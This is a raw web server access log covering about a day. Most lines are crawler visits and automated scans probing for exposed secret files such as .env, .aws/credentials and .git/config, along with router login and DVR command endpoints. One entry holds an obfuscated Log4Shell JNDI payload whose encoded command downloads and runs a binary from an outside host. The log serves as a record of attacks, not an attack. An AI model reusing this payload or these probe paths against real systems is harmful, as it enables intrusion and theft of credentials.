154.12.227.91 - - [11/May/2023:18:29:41 +0000] "GET /newsite/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:41 +0000] "POST /newsite/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:43 +0000] "GET /www/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:43 +0000] "POST /www/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:45 +0000] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:45 +0000] "POST /sites/all/libraries/mailchimp/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:46 +0000] "GET /database/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:46 +0000] "POST /database/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:49 +0000] "GET /public/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.12.227.91 - - [11/May/2023:18:29:49 +0000] "POST /public/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.216.237.60 - - [11/May/2023:18:32:47 +0000] "GET / HTTP/1.1" 200 6603 "-" "l9tcpid/v1.1.0"
35.216.237.60 - - [11/May/2023:18:32:48 +0000] "GET /.git/config HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.237.60 - - [11/May/2023:18:32:48 +0000] "GET /server-status HTTP/1.1" 403 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.237.60 - - [11/May/2023:18:32:48 +0000] "GET /config.json HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.237.60 - - [11/May/2023:18:32:48 +0000] "GET /.env HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.237.60 - - [11/May/2023:18:32:48 +0000] "GET /telescope/requests HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.237.60 - - [11/May/2023:18:32:49 +0000] "GET /info.php HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
81.166.58.249 - - [11/May/2023:18:35:08 +0000] "GET /pool.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [11/May/2023:18:35:08 +0000] "GET /output.css HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [11/May/2023:18:35:08 +0000] "GET /logo.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [11/May/2023:18:35:09 +0000] "GET /logo.jpg HTTP/1.1" 404 418 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
45.95.169.240 - - [11/May/2023:18:59:01 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.95.169.240 - - [11/May/2023:18:59:02 +0000] "POST /dvr/cmd HTTP/1.1" 404 363 "-" "Abcd"
45.95.169.240 - - [11/May/2023:18:59:02 +0000] "POST /cn/cmd HTTP/1.1" 404 363 "-" "Abcd"
54.37.79.75 - - [11/May/2023:19:17:50 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:19:17:50 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.53.99 - - [11/May/2023:19:38:05 +0000] "GET / HTTP/1.1" 200 6603 "t('${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//45.152.113.109:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTA3LjE3Mi4yMDYuMTE0Ly51cGdyYWRlL2Nyb256eiA7IGN1cmwgLU8gaHR0cDovLzEwNy4xNzIuMjA2LjExNC8udXBncmFkZS9jcm9uenogOyBjaG1vZCAreCBjcm9uenogOyBjaG1vZCA3NzcgY3Jvbnp6IDsgLi9jcm9ueiB4ODYgOyBzdWRvIC4vY3JvbnogeDg2IDsgcm0gLXJmIGNyb256eg==}')" "t('${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//45.152.113.109:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTA3LjE3Mi4yMDYuMTE0Ly51cGdyYWRlL2Nyb256eiA7IGN1cmwgLU8gaHR0cDovLzEwNy4xNzIuMjA2LjExNC8udXBncmFkZS9jcm9uenogOyBjaG1vZCAreCBjcm9uenogOyBjaG1vZCA3NzcgY3Jvbnp6IDsgLi9jcm9ueiB4ODYgOyBzdWRvIC4vY3JvbnogeDg2IDsgcm0gLXJmIGNyb256eg==}')"
54.37.79.75 - - [11/May/2023:19:57:34 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:19:57:34 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:21:21:54 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:21:21:54 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.99.54.211 - - [11/May/2023:21:25:19 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.37.79.75 - - [11/May/2023:22:24:26 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:22:24:27 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.98.133.164 - - [11/May/2023:22:43:25 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.98.133.164 - - [11/May/2023:22:43:25 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
16.170.216.71 - - [11/May/2023:22:53:05 +0000] "GET /.git/config HTTP/1.1" 404 382 "-" "AdsBot-Google ( http://www.google.com/adsbot.html)"
20.245.100.243 - - [11/May/2023:22:55:05 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.245.100.243 - - [11/May/2023:22:55:06 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.72.14 - - [11/May/2023:23:17:39 +0000] "GET /app.wsgi HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
223.247.179.42 - - [11/May/2023:23:21:48 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
66.249.72.10 - - [11/May/2023:23:23:31 +0000] "GET / HTTP/1.1" 200 2150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.10 - - [11/May/2023:23:26:24 +0000] "GET /app.py HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.37.79.75 - - [11/May/2023:23:36:23 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [11/May/2023:23:36:24 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.144 - - [11/May/2023:23:40:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.82.77.139 - - [11/May/2023:23:42:23 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
80.82.77.139 - - [11/May/2023:23:42:23 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "-"
80.82.77.139 - - [11/May/2023:23:42:23 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "-"
80.82.77.139 - - [11/May/2023:23:42:23 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 363 "-" "-"
80.82.77.139 - - [11/May/2023:23:42:24 +0000] "GET /logo.jpg HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
66.249.72.14 - - [11/May/2023:23:58:38 +0000] "GET / HTTP/1.1" 200 2150 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.37.79.75 - - [12/May/2023:00:20:53 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:00:20:53 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.13 - - [12/May/2023:00:27:08 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
162.142.125.13 - - [12/May/2023:00:27:08 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.13 - - [12/May/2023:00:27:08 +0000] "GET /logo.jpg HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.13 - - [12/May/2023:00:27:08 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
104.199.31.214 - - [12/May/2023:00:57:21 +0000] "GET / HTTP/1.1" 200 2150 "-" "python-requests/2.28.2"
152.89.196.144 - - [12/May/2023:00:58:26 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.91.229.233 - - [12/May/2023:01:11:43 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
89.186.157.221 - - [12/May/2023:01:26:47 +0000] "GET / HTTP/1.1" 200 6584 "-" "Hello World"
54.37.79.75 - - [12/May/2023:01:30:30 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:01:30:30 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:02:49:22 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:02:49:22 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.136.109.43 - - [12/May/2023:03:07:41 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.72.10 - - [12/May/2023:03:37:20 +0000] "GET /robots.txt HTTP/1.1" 404 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.14 - - [12/May/2023:03:37:20 +0000] "GET /database.sqbpro HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.67.105.145 - - [12/May/2023:03:50:38 +0000] "POST / HTTP/1.1" 405 345 "-" "-"
208.67.105.145 - - [12/May/2023:03:50:38 +0000] "GET /.env HTTP/1.1" 404 363 "-" "-"
54.37.79.75 - - [12/May/2023:03:59:34 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:03:59:34 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.95.169.240 - - [12/May/2023:04:11:03 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.95.169.240 - - [12/May/2023:04:11:04 +0000] "POST /dvr/cmd HTTP/1.1" 404 363 "-" "Abcd"
45.95.169.240 - - [12/May/2023:04:11:04 +0000] "POST /cn/cmd HTTP/1.1" 404 363 "-" "Abcd"
42.235.148.140 - - [12/May/2023:04:41:22 +0000] "POST /HNAP1/ HTTP/1.0" 500 803 "-" "-"
54.37.79.75 - - [12/May/2023:04:55:31 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:04:55:31 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.248.172.16 - - [12/May/2023:05:14:11 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
89.248.172.16 - - [12/May/2023:05:14:13 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "-"
89.248.172.16 - - [12/May/2023:05:14:14 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "-"
89.248.172.16 - - [12/May/2023:05:14:15 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 363 "-" "-"
89.248.172.16 - - [12/May/2023:05:14:16 +0000] "GET /logo.jpg HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
23.98.133.164 - - [12/May/2023:05:23:22 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.98.133.164 - - [12/May/2023:05:23:22 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.21 - - [12/May/2023:05:56:54 +0000] "GET / HTTP/1.1" 200 6584 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
54.37.79.75 - - [12/May/2023:06:07:07 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [12/May/2023:06:07:07 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.243 - - [12/May/2023:06:17:11 +0000] "GET / HTTP/1.1" 200 6584 "-" "Hello World"
35.203.210.137 - - [12/May/2023:06:33:59 +0000] "GET / HTTP/1.1" 200 6584 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.177.243 - - [12/May/2023:07:24:10 +0000] "GET / HTTP/1.1" 200 6584 "-" "Hello World"
139.162.193.219 - - [12/May/2023:07:48:32 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
51.79.29.48 - - [12/May/2023:08:47:24 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:08:47:24 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.84.51.132 - - [12/May/2023:09:07:02 +0000] "HEAD / HTTP/1.1" 200 251 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:03 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:05 +0000] "GET /.aws/credentials HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:06 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:07 +0000] "GET /.env.bak HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:08 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:10 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
45.79.181.104 - - [12/May/2023:09:07:11 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.84.51.132 - - [12/May/2023:09:07:11 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:13 +0000] "GET /admin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:16 +0000] "GET /api/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:17 +0000] "GET /aws.yml HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:18 +0000] "GET /config.js HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:20 +0000] "GET /config/aws.yml HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:22 +0000] "GET /info.json HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:23 +0000] "GET /info.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:24 +0000] "GET /laravel/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:26 +0000] "GET /php-info HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:28 +0000] "GET /phpinfo HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:30 +0000] "GET /phpinfo.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
54.84.51.132 - - [12/May/2023:09:07:32 +0000] "GET /test.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
20.55.58.5 - - [12/May/2023:09:38:55 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.55.58.5 - - [12/May/2023:09:38:55 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:09:49:25 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:09:49:25 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.135 - - [12/May/2023:09:54:28 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
64.62.197.132 - - [12/May/2023:09:55:31 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.128 - - [12/May/2023:09:56:07 +0000] "GET /geoserver/web/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
51.79.29.48 - - [12/May/2023:10:45:09 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:10:45:09 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.245.100.243 - - [12/May/2023:10:50:59 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.245.100.243 - - [12/May/2023:10:50:59 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.243 - - [12/May/2023:11:21:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
